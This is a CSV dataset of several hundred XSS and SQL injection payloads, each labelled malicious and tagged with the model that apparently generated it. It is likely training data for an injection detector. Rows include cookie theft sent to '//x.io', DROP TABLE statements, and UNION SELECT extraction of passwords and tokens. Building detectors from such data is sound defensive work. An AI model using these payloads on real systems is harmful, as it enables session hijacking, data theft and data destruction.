text,label,attack_type,generator
"<object onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><a onpointerover=location='//x.io'>",1,xss,codellama
"""><iframe onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><input onerror=print()>,1,xss,codellama
"""><body oninput=alert(document.domain)>",1,xss,codellama
"<a href=""javascript:print()"">x</a>",1,xss,codellama
"<audio onfocus=""alert(1)"">",1,xss,codellama
"""><script onmouseover=location='//x.io'>",1,xss,codellama
<details onerror=alert(1)>,1,xss,codellama
<body ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<img ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><a onerror=confirm(1)>",1,xss,codellama
<script onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><div ontoggle=alert(document.cookie)>",1,xss,codellama
"""><svg onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><div onstart=print()>,1,xss,codellama
"""><a onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><body oninput=alert(1)>",1,xss,codellama
"<body ontoggle=""location='//x.io'"">",1,xss,codellama
'><a oninput=print()>,1,xss,codellama
'><video ontoggle=alert(document.cookie)>,1,xss,codellama
"<input ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<div onpointerover=""print()"">",1,xss,codellama
"""><script onmouseover=alert(document.domain)>",1,xss,codellama
<img onfocus=alert(document.domain)>,1,xss,codellama
"""><a onclick=location='//x.io'>",1,xss,codellama
"""><svg onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><object onfocus=alert(document.cookie)>,1,xss,codellama
'><marquee onmouseover=alert(document.cookie)>,1,xss,codellama
"<body onfocus=""print()"">",1,xss,codellama
"<audio ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"<video onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
'><details onanimationstart=alert(document.cookie)>,1,xss,codellama
"""><object ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"<iframe onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><video onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"<marquee onclick=""confirm(1)"">",1,xss,codellama
<body onclick=confirm(1)>,1,xss,codellama
<a onmouseover=alert(document.domain)>,1,xss,codellama
"""><object onload=alert(1)>",1,xss,codellama
<body onmouseover=alert(1)>,1,xss,codellama
'><iframe ontoggle=alert(1)>,1,xss,codellama
'><details onfocus=location='//x.io'>,1,xss,codellama
'><marquee onload=print()>,1,xss,codellama
"<video onanimationstart=""alert(document.cookie)"">",1,xss,codellama
"""><details onanimationstart=alert(document.domain)>",1,xss,codellama
'><video onload=alert(document.cookie)>,1,xss,codellama
'><a oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<input onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<object onclick=alert(document.cookie)>,1,xss,codellama
"""><object onanimationstart=print()>",1,xss,codellama
"<input onanimationstart=""alert(document.domain)"">",1,xss,codellama
"""><video onanimationstart=confirm(1)>",1,xss,codellama
"<audio onload=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><div onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<details onanimationstart=alert(1)>,1,xss,codellama
'><a onload=confirm(1)>,1,xss,codellama
'><input onload=alert(document.domain)>,1,xss,codellama
"<div oninput=""confirm(1)"">",1,xss,codellama
<marquee oninput=alert(document.cookie)>,1,xss,codellama
'><svg onpointerover=alert(document.domain)>,1,xss,codellama
<iframe onanimationstart=confirm(1)>,1,xss,codellama
') AND (SELECT COUNT(*) FROM sessions)>0#,1,sqli,deepseek-r1
']; DROP TABLE admin-- -,1,sqli,deepseek-r1
')%09AND%091 BETWEEN 0 AND 9%09#,1,sqli,deepseek-r1
')/**/AND/**/'a'='a'/**/-- -,1,sqli,deepseek-r1
"' UNION SELECT token,pwd,first_name,name,user,uid FROM admin--",1,sqli,deepseek-r1
') UNION SELECT id FROM customers--,1,sqli,deepseek-r1
'%0aOR%0a'a'='a'%0a-- -,1,sqli,deepseek-r1
""") AND (SELECT COUNT(*) FROM accounts)>0/*x*/",1,sqli,deepseek-r1
`%09OR%091=2%09-- -,1,sqli,deepseek-r1
'	AND	1 BETWEEN 0 AND 9	#,1,sqli,deepseek-r1
""")%09OR%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
""") UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL%23",1,sqli,deepseek-r1
"' UNION SELECT username,role FROM tokens%23",1,sqli,deepseek-r1
""")/**/OR/**/1 LIKE 1/**//*x*/",1,sqli,deepseek-r1
`%0aAND%0a0<1%0a#,1,sqli,deepseek-r1
')%0aOR%0a''=''%0a-- -,1,sqli,deepseek-r1
'; DROP TABLE staff--,1,sqli,deepseek-r1
"""%0aAND%0a1 BETWEEN 0 AND 9%0a-- ",1,sqli,deepseek-r1
`; DROP TABLE orders-- ,1,sqli,deepseek-r1
""")+OR+''=''+#",1,sqli,deepseek-r1
`	OR	1=2	/*x*/,1,sqli,deepseek-r1
`	AND	1 LIKE 1	--,1,sqli,deepseek-r1
'); SELECT SLEEP(5)#,1,sqli,deepseek-r1
') OR 0<1 /*x*/,1,sqli,deepseek-r1
""")/**/AND/**/'a'='a'/**/-- ",1,sqli,deepseek-r1
'+AND+1 LIKE 1+--,1,sqli,deepseek-r1
')%0d%0aOR%0d%0a'a'='a'%0d%0a%23,1,sqli,deepseek-r1
"""+AND+1 LIKE 1+%23",1,sqli,deepseek-r1
'%0d%0aOR%0d%0a1=1%0d%0a#,1,sqli,deepseek-r1
"""%0aAND%0a1 BETWEEN 0 AND 9%0a/*x*/",1,sqli,deepseek-r1
"""); DROP TABLE orders-- ",1,sqli,deepseek-r1
""")+OR+''=''+%23",1,sqli,deepseek-r1
' AND (SELECT COUNT(*) FROM members)>0--,1,sqli,deepseek-r1
`%0aOR%0a0<1%0a-- ,1,sqli,deepseek-r1
') UNION SELECT NULL-- -,1,sqli,deepseek-r1
']	AND	1 BETWEEN 0 AND 9	/*x*/,1,sqli,deepseek-r1
'] AND (SELECT COUNT(*) FROM sessions)>0--,1,sqli,deepseek-r1
""")	AND	1 BETWEEN 0 AND 9	-- -",1,sqli,deepseek-r1
` AND (SELECT COUNT(*) FROM orders)>0%23,1,sqli,deepseek-r1
"' UNION SELECT NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
""")	OR	1 LIKE 1	-- ",1,sqli,deepseek-r1
"' UNION SELECT email,last_name,name,password FROM customers%23",1,sqli,deepseek-r1
"""); DROP TABLE users-- -",1,sqli,deepseek-r1
""")%0d%0aAND%0d%0a0<1%0d%0a--",1,sqli,deepseek-r1
'); DROP TABLE admin-- ,1,sqli,deepseek-r1
`%09OR%091 LIKE 1%09-- -,1,sqli,deepseek-r1
'%09AND%091 BETWEEN 0 AND 9%09#,1,sqli,deepseek-r1
']%0d%0aOR%0d%0a1 LIKE 1%0d%0a-- -,1,sqli,deepseek-r1
"""%0aOR%0a1=2%0a--",1,sqli,deepseek-r1
') AND (SELECT COUNT(*) FROM sessions)>0/*x*/,1,sqli,deepseek-r1
""")%0aOR%0a2>1%0a%23",1,sqli,deepseek-r1
']	AND	'a'='a'	%23,1,sqli,deepseek-r1
""") AND (SELECT COUNT(*) FROM users)>0--",1,sqli,deepseek-r1
')+AND+1=2+-- -,1,sqli,deepseek-r1
""") AND (SELECT COUNT(*) FROM users)>0%23",1,sqli,deepseek-r1
""" OR 2>1 %23",1,sqli,deepseek-r1
"""%0aOR%0a1 BETWEEN 0 AND 9%0a-- ",1,sqli,deepseek-r1
""")+AND+1 LIKE 1+-- -",1,sqli,deepseek-r1
""")/**/AND/**/1=1/**//*x*/",1,sqli,deepseek-r1
""") UNION SELECT NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
`	AND	2>1	-- -,1,sqli,deepseek-r1
']	OR	''=''	-- ,1,sqli,deepseek-r1
']%0d%0aAND%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
`/**/OR/**/1 BETWEEN 0 AND 9/**//*x*/,1,sqli,deepseek-r1
`%0d%0aOR%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
`/**/OR/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
""")%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23",1,sqli,deepseek-r1
`%09OR%091=1%09-- -,1,sqli,deepseek-r1
'	OR	2>1	%23,1,sqli,deepseek-r1
""") AND (SELECT COUNT(*) FROM tokens)>0/*x*/",1,sqli,deepseek-r1
'] UNION SELECT id FROM customers%23,1,sqli,deepseek-r1
`%0aAND%0a0<1%0a%23,1,sqli,deepseek-r1
"""%09OR%091=2%09/*x*/",1,sqli,deepseek-r1
'/**/OR/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,deepseek-r1
')%0d%0aOR%0d%0a1=2%0d%0a-- -,1,sqli,deepseek-r1
` AND (SELECT COUNT(*) FROM sessions)>0--,1,sqli,deepseek-r1
""")	OR	1=1	#",1,sqli,deepseek-r1
"""); DROP TABLE staff--",1,sqli,deepseek-r1
'/**/AND/**/2>1/**/#,1,sqli,deepseek-r1
""") AND 0<1 /*x*/",1,sqli,deepseek-r1
')%09AND%092>1%09--,1,sqli,deepseek-r1
`	AND	1 BETWEEN 0 AND 9	/*x*/,1,sqli,deepseek-r1
"""/**/OR/**/1 LIKE 1/**/--",1,sqli,deepseek-r1
`/**/OR/**/1=2/**/#,1,sqli,deepseek-r1
') OR 1=1 #,1,sqli,deepseek-r1
'] AND ''='' #,1,sqli,deepseek-r1
' AND (SELECT COUNT(*) FROM staff)>0%23,1,sqli,deepseek-r1
']	OR	2>1	#,1,sqli,deepseek-r1
"""+OR+1=2+-- ",1,sqli,deepseek-r1
'] AND 1 LIKE 1 #,1,sqli,deepseek-r1
"` UNION SELECT last_name,id,role,status FROM sessions-- -",1,sqli,deepseek-r1
"""%0d%0aAND%0d%0a1=1%0d%0a/*x*/",1,sqli,deepseek-r1
"""%0d%0aOR%0d%0a''=''%0d%0a%23",1,sqli,deepseek-r1
"""; DROP TABLE sessions#",1,sqli,deepseek-r1
' AND 1=1 /*x*/,1,sqli,deepseek-r1
""" OR ''='' #",1,sqli,deepseek-r1
`; DROP TABLE admin%23,1,sqli,deepseek-r1
""" UNION SELECT id,uid FROM members%23",1,sqli,deepseek-r1
""")	OR	1=2	--",1,sqli,deepseek-r1
`/**/AND/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
""")	AND	2>1	-- ",1,sqli,deepseek-r1
` AND 'a'='a' %23,1,sqli,deepseek-r1
""")%09OR%091 LIKE 1%09/*x*/",1,sqli,deepseek-r1
` AND (SELECT COUNT(*) FROM credentials)>0/*x*/,1,sqli,deepseek-r1
"""; DROP TABLE admin/*x*/",1,sqli,deepseek-r1
""") OR (SELECT user FROM tokens WHERE user=618)=610",1,sqli,deepseek-r1
'	OR	2>1	#,1,sqli,deepseek-r1
` UNION SELECT NULL/*x*/,1,sqli,deepseek-r1
'	OR	'a'='a'	-- -,1,sqli,deepseek-r1
"""	OR	''=''	-- ",1,sqli,deepseek-r1
"""%09AND%091 BETWEEN 0 AND 9%09-- ",1,sqli,deepseek-r1
')	OR	1 BETWEEN 0 AND 9	-- ,1,sqli,deepseek-r1
`+OR+1=1+/*x*/,1,sqli,deepseek-r1
"') UNION SELECT name,account,email FROM orders#",1,sqli,deepseek-r1
'	AND	0<1	#,1,sqli,deepseek-r1
""")	OR	2>1	%23",1,sqli,deepseek-r1
""")/**/OR/**/0<1/**/--",1,sqli,deepseek-r1
"""%09OR%092>1%09-- ",1,sqli,deepseek-r1
' AND 1=1 -- ,1,sqli,deepseek-r1
`/**/OR/**/1 LIKE 1/**/%23,1,sqli,deepseek-r1
""")%0aOR%0a2>1%0a-- -",1,sqli,deepseek-r1
`; SELECT SLEEP(5)/*x*/,1,sqli,deepseek-r1
']/**/AND/**/''=''/**/#,1,sqli,deepseek-r1
"') AND extractvalue(1,concat(0x7e,(SELECT password FROM customers LIMIT 1)))",1,sqli,deepseek-r1
"""/**/OR/**/1=1/**/-- -",1,sqli,deepseek-r1
') AND 1 BETWEEN 0 AND 9 %23,1,sqli,deepseek-r1
""") AND extractvalue(1,concat(0x7e,(SELECT user FROM staff LIMIT 1)))",1,sqli,deepseek-r1
') OR 1=1 LIMIT 1-- ,1,sqli,deepseek-r1
""")/**/OR/**/'a'='a'/**/%23",1,sqli,deepseek-r1
'+OR+1 LIKE 1+/*x*/,1,sqli,deepseek-r1
"""+OR+''=''+-- -",1,sqli,deepseek-r1
""") OR (SELECT name FROM orders WHERE name=841)=906",1,sqli,deepseek-r1
'] OR (SELECT token FROM credentials WHERE token=136)=953,1,sqli,deepseek-r1
']%0aAND%0a1=2%0a-- ,1,sqli,deepseek-r1
"""+AND+''=''+-- ",1,sqli,deepseek-r1
""") AND (SELECT COUNT(*) FROM tokens)>0-- -",1,sqli,deepseek-r1
'/**/OR/**/''=''/**/-- -,1,sqli,deepseek-r1
`%09OR%091 BETWEEN 0 AND 9%09/*x*/,1,sqli,deepseek-r1
"""; DROP TABLE admin#",1,sqli,deepseek-r1
'] OR ''='' -- ,1,sqli,deepseek-r1
"""%09AND%09''=''%09--",1,sqli,deepseek-r1
"` UNION SELECT NULL,NULL,NULL#",1,sqli,deepseek-r1
"""/**/AND/**/1=2/**//*x*/",1,sqli,deepseek-r1
"""	AND	0<1	/*x*/",1,sqli,deepseek-r1
')/**/AND/**/1 LIKE 1/**/#,1,sqli,deepseek-r1
'	OR	1=1	-- ,1,sqli,deepseek-r1
']%0aAND%0a1=1%0a--,1,sqli,deepseek-r1
')%09AND%092>1%09%23,1,sqli,deepseek-r1
""")/**/OR/**/''=''/**/--",1,sqli,deepseek-r1
""") UNION SELECT NULL,NULL#",1,sqli,deepseek-r1
')	AND	1=2	-- -,1,sqli,deepseek-r1
""" OR 1 LIKE 1 -- ",1,sqli,deepseek-r1
""") AND 2>1 -- ",1,sqli,deepseek-r1
"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a-- ",1,sqli,deepseek-r1
""" AND 1 LIKE 1 --",1,sqli,deepseek-r1
"""%09AND%09'a'='a'%09--",1,sqli,deepseek-r1
']%0aOR%0a1 BETWEEN 0 AND 9%0a--,1,sqli,deepseek-r1
"') UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",1,sqli,deepseek-r1
`%0d%0aAND%0d%0a1=1%0d%0a%23,1,sqli,deepseek-r1
'; DROP TABLE orders%23,1,sqli,deepseek-r1
')	OR	1 BETWEEN 0 AND 9	-- -,1,sqli,deepseek-r1
')+OR+1=1+-- ,1,sqli,deepseek-r1
`%0aAND%0a2>1%0a/*x*/,1,sqli,deepseek-r1
' OR 1 LIKE 1 --,1,sqli,deepseek-r1
"""	OR	''=''	/*x*/",1,sqli,deepseek-r1
"` UNION SELECT role,account FROM accounts--",1,sqli,deepseek-r1
""") AND ''='' /*x*/",1,sqli,deepseek-r1
"'] UNION SELECT account,role,email FROM staff#",1,sqli,deepseek-r1
`%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,deepseek-r1
"""%09OR%091=1%09-- -",1,sqli,deepseek-r1
"""%0d%0aAND%0d%0a''=''%0d%0a#",1,sqli,deepseek-r1
`/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,deepseek-r1
']/**/AND/**/2>1/**/-- -,1,sqli,deepseek-r1
""") OR 2>1 /*x*/",1,sqli,deepseek-r1
`+OR+1 BETWEEN 0 AND 9+/*x*/,1,sqli,deepseek-r1
'] AND 2>1 #,1,sqli,deepseek-r1
'] OR 0<1 #,1,sqli,deepseek-r1
"""%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -",1,sqli,deepseek-r1
'/**/AND/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
""")/**/OR/**/0<1/**/#",1,sqli,deepseek-r1
`	AND	1=2	/*x*/,1,sqli,deepseek-r1
'%09AND%092>1%09/*x*/,1,sqli,deepseek-r1
' AND (SELECT COUNT(*) FROM admin)>0/*x*/,1,sqli,deepseek-r1
')/**/OR/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
"""%09OR%091=2%09#",1,sqli,deepseek-r1
"') UNION SELECT email,pwd,password,id,token FROM admin#",1,sqli,deepseek-r1
""" OR 0<1 -- -",1,sqli,deepseek-r1
'%09AND%09''=''%09--,1,sqli,deepseek-r1
']%0aAND%0a'a'='a'%0a-- ,1,sqli,deepseek-r1
""")%09OR%091=1%09-- ",1,sqli,deepseek-r1
""")/**/OR/**/2>1/**//*x*/",1,sqli,deepseek-r1
""")%0aOR%0a1=1%0a/*x*/",1,sqli,deepseek-r1
']%09AND%090<1%09%23,1,sqli,deepseek-r1
']+OR+''=''+--,1,sqli,deepseek-r1
"` UNION SELECT NULL,NULL,NULL-- -",1,sqli,deepseek-r1
')	OR	''=''	#,1,sqli,deepseek-r1
"""+OR+0<1+-- ",1,sqli,deepseek-r1
`%0d%0aAND%0d%0a1=2%0d%0a--,1,sqli,deepseek-r1
'	AND	''=''	-- -,1,sqli,deepseek-r1
'; DROP TABLE sessions/*x*/,1,sqli,deepseek-r1
"` AND extractvalue(1,concat(0x7e,(SELECT last_name FROM tokens LIMIT 1)))",1,sqli,deepseek-r1
`+AND+'a'='a'+/*x*/,1,sqli,deepseek-r1
'	AND	1=1	%23,1,sqli,deepseek-r1
'/**/OR/**/1=1/**/%23,1,sqli,deepseek-r1
""")+AND+'a'='a'+--",1,sqli,deepseek-r1
']%0d%0aAND%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
"') AND extractvalue(1,concat(0x7e,(SELECT account FROM members LIMIT 1)))",1,sqli,deepseek-r1
""" OR (SELECT last_name FROM accounts WHERE last_name=224)=71",1,sqli,deepseek-r1
']%0aAND%0a0<1%0a--,1,sqli,deepseek-r1
""") OR (SELECT pwd FROM sessions WHERE pwd=946)=611",1,sqli,deepseek-r1
') OR (SELECT email FROM users WHERE email=250)=785,1,sqli,deepseek-r1
'	OR	''=''	-- ,1,sqli,deepseek-r1
""") OR (SELECT account FROM tokens WHERE account=532)=357",1,sqli,deepseek-r1
` AND 0<1 --,1,sqli,deepseek-r1
']%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,deepseek-r1
""")%0aOR%0a''=''%0a--",1,sqli,deepseek-r1
"""%09OR%091 LIKE 1%09-- -",1,sqli,deepseek-r1
""")%0aOR%0a1=2%0a--",1,sqli,deepseek-r1
']/**/AND/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,deepseek-r1
`%0aOR%0a0<1%0a#,1,sqli,deepseek-r1
"'] UNION SELECT name,uid,pwd FROM staff/*x*/",1,sqli,deepseek-r1
""") OR 1=1 LIMIT 1--",1,sqli,deepseek-r1
')+OR+1 LIKE 1+%23,1,sqli,deepseek-r1
`%09AND%092>1%09/*x*/,1,sqli,deepseek-r1
`	AND	1 BETWEEN 0 AND 9	#,1,sqli,deepseek-r1
""") UNION SELECT name,password,user,pwd FROM admin#",1,sqli,deepseek-r1
' OR 2>1 -- -,1,sqli,deepseek-r1
')%0aAND%0a'a'='a'%0a/*x*/,1,sqli,deepseek-r1
']%09AND%091=2%09#,1,sqli,deepseek-r1
"""	OR	1=2	--",1,sqli,deepseek-r1
']%09OR%092>1%09-- -,1,sqli,deepseek-r1
""")	OR	1 LIKE 1	--",1,sqli,deepseek-r1
')%09OR%09'a'='a'%09--,1,sqli,deepseek-r1
""") OR (SELECT token FROM credentials WHERE token=776)=800",1,sqli,deepseek-r1
'+AND+1=1+--,1,sqli,deepseek-r1
'); DROP TABLE staff/*x*/,1,sqli,deepseek-r1
""")%0d%0aOR%0d%0a'a'='a'%0d%0a/*x*/",1,sqli,deepseek-r1
"') UNION SELECT name,account FROM users-- -",1,sqli,deepseek-r1
']/**/OR/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,deepseek-r1
"""	AND	'a'='a'	--",1,sqli,deepseek-r1
']+OR+2>1+%23,1,sqli,deepseek-r1
`%0d%0aAND%0d%0a0<1%0d%0a-- ,1,sqli,deepseek-r1
' AND 1=2 /*x*/,1,sqli,deepseek-r1
`%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -,1,sqli,deepseek-r1
') OR 2>1 #,1,sqli,deepseek-r1
')%0aAND%0a1=1%0a#,1,sqli,deepseek-r1
"') UNION SELECT email,role,name,last_name,status,id FROM members/*x*/",1,sqli,deepseek-r1
'%0d%0aAND%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
"""+AND+1=2+-- ",1,sqli,deepseek-r1
"""/**/AND/**/'a'='a'/**/--",1,sqli,deepseek-r1
`/**/AND/**/1=2/**/#,1,sqli,deepseek-r1
"""%0d%0aOR%0d%0a'a'='a'%0d%0a-- ",1,sqli,deepseek-r1
""")%0aAND%0a'a'='a'%0a-- ",1,sqli,deepseek-r1
""")	AND	1 BETWEEN 0 AND 9	-- ",1,sqli,deepseek-r1
""" UNION SELECT NULL,NULL,NULL,NULL-- ",1,sqli,deepseek-r1
`/**/AND/**/1=1/**//*x*/,1,sqli,deepseek-r1
'%0aOR%0a0<1%0a-- ,1,sqli,deepseek-r1
')%0d%0aAND%0d%0a2>1%0d%0a-- -,1,sqli,deepseek-r1
""")%0aAND%0a1 LIKE 1%0a/*x*/",1,sqli,deepseek-r1
"""%0aOR%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
')%0d%0aAND%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
"""%09OR%092>1%09%23",1,sqli,deepseek-r1
`/**/AND/**/1 LIKE 1/**/--,1,sqli,deepseek-r1
""") OR 0<1 --",1,sqli,deepseek-r1
"""; DROP TABLE members#",1,sqli,deepseek-r1
""")	AND	1 LIKE 1	--",1,sqli,deepseek-r1
')%0d%0aAND%0d%0a2>1%0d%0a--,1,sqli,deepseek-r1
'/**/AND/**/''=''/**/#,1,sqli,deepseek-r1
')%0aAND%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,deepseek-r1
""" UNION SELECT NULL,NULL,NULL%23",1,sqli,deepseek-r1
""") UNION SELECT NULL,NULL%23",1,sqli,deepseek-r1
"'] UNION SELECT uid,role,username,email,first_name FROM members-- -",1,sqli,deepseek-r1
')+OR+1=2+--,1,sqli,deepseek-r1
"""%09OR%09'a'='a'%09-- -",1,sqli,deepseek-r1
']+OR+2>1+#,1,sqli,deepseek-r1
` OR 1=1 LIMIT 1--,1,sqli,deepseek-r1
"'] UNION SELECT NULL,NULL-- ",1,sqli,deepseek-r1
'%0aOR%0a1 BETWEEN 0 AND 9%0a#,1,sqli,deepseek-r1
')+OR+1 BETWEEN 0 AND 9+-- -,1,sqli,deepseek-r1
""")%09AND%091=2%09/*x*/",1,sqli,deepseek-r1
'%0d%0aAND%0d%0a'a'='a'%0d%0a%23,1,sqli,deepseek-r1
')%0aAND%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
' AND (SELECT COUNT(*) FROM users)>0%23,1,sqli,deepseek-r1
"""%0aAND%0a1=1%0a/*x*/",1,sqli,deepseek-r1
`+OR+1 BETWEEN 0 AND 9+-- ,1,sqli,deepseek-r1
""") AND extractvalue(1,concat(0x7e,(SELECT name FROM accounts LIMIT 1)))",1,sqli,deepseek-r1
""" AND (SELECT COUNT(*) FROM orders)>0/*x*/",1,sqli,deepseek-r1
']%0d%0aAND%0d%0a''=''%0d%0a-- -,1,sqli,deepseek-r1
"') UNION SELECT NULL,NULL#",1,sqli,deepseek-r1
"') UNION SELECT NULL,NULL-- ",1,sqli,deepseek-r1
' AND 0<1 #,1,sqli,deepseek-r1
')/**/AND/**/0<1/**//*x*/,1,sqli,deepseek-r1
"""%09AND%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
` AND ''='' -- -,1,sqli,deepseek-r1
""" AND (SELECT COUNT(*) FROM staff)>0-- ",1,sqli,deepseek-r1
` AND (SELECT COUNT(*) FROM sessions)>0/*x*/,1,sqli,deepseek-r1
')%0aOR%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
""")%0aAND%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
"' UNION SELECT role,username FROM orders/*x*/",1,sqli,deepseek-r1
""")%09AND%091 LIKE 1%09-- ",1,sqli,deepseek-r1
<object ontoggle=location='//x.io'>,1,xss,deepseek-r1
"""><div onload=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
"""><iframe onpointerover=print()>",1,xss,deepseek-r1
'><marquee onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
'><a ontoggle=confirm(1)>,1,xss,deepseek-r1
"""><details onfocus=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
"<svg onfocus=""location='//x.io'"">",1,xss,deepseek-r1
'><svg onmouseover=location='//x.io'>,1,xss,deepseek-r1
"""><svg ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
<iframe onload=alert(1)>,1,xss,deepseek-r1
'><audio oninput=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
<details onload=alert(document.cookie)>,1,xss,deepseek-r1
<input onstart=alert(1)>,1,xss,deepseek-r1
"<input onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
"<div onload=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
<div onfocus=alert(1)>,1,xss,deepseek-r1
"<img onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
"<audio onstart=""location='//x.io'"">",1,xss,deepseek-r1
<iframe ontoggle=location='//x.io'>,1,xss,deepseek-r1
"""><iframe onmouseover=print()>",1,xss,deepseek-r1
'><div onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
"""><iframe onanimationstart=alert(document.domain)>",1,xss,deepseek-r1
"""><a onfocus=confirm(1)>",1,xss,deepseek-r1
"<iframe onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
<video onpointerover=location='//x.io'>,1,xss,deepseek-r1
<a ontoggle=alert(document.domain)>,1,xss,deepseek-r1
"<audio oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
<marquee onerror=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
'><a onanimationstart=alert(document.cookie)>,1,xss,deepseek-r1
<scr<script>ipt>fetch('//x.io/'+document.cookie)</script>,1,xss,deepseek-r1
"<video onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
<div onfocus=confirm(1)>,1,xss,deepseek-r1
"""><div onerror=alert(document.domain)>",1,xss,deepseek-r1
'><details onload=print()>,1,xss,deepseek-r1
"<script onerror=""alert(1)"">",1,xss,deepseek-r1
'><div ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
<script onfocus=alert(1)>,1,xss,deepseek-r1
"""><iframe onload=alert(document.cookie)>",1,xss,deepseek-r1
'><input onpointerover=alert(1)>,1,xss,deepseek-r1
'><input oninput=alert(document.cookie)>,1,xss,deepseek-r1
<input oninput=alert(document.domain)>,1,xss,deepseek-r1
"<body onanimationstart=""location='//x.io'"">",1,xss,deepseek-r1
"<a onmouseover=""alert(document.cookie)"">",1,xss,deepseek-r1
"<audio onclick=""alert(document.domain)"">",1,xss,deepseek-r1
"<script onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
<scr<script>ipt>location='//x.io'</script>,1,xss,deepseek-r1
"""><video onload=alert(1)>",1,xss,deepseek-r1
